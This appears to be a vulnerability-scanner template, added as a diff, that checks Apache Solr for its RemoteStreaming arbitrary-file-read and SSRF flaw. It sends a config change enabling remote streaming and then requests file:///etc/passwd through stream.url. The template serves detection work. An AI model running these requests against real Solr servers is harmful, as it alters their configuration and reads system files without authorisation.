@@ -1,0 +1,35 @@
+name: Apache_Solr_RemoteStreaming文件读取与SSRF漏洞
+manual: true
+query: app=solr
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /solr/admin/cores?indexInfo=false&wt=json
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"\"name\":\"demo\"")
+  r1:
+    request:
+      method: POST
+      path: /solr/demo/config
+      body: '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
+      follow_redirects: true
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: /solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"file:///etc/passwd")
+expression: r0() && r1() && r2()
+detail:
+  author: k3vi_07@icloud.com
+  links:
+  - https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
+  description: Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。
+  tags: Disclosure of Sensitive Information
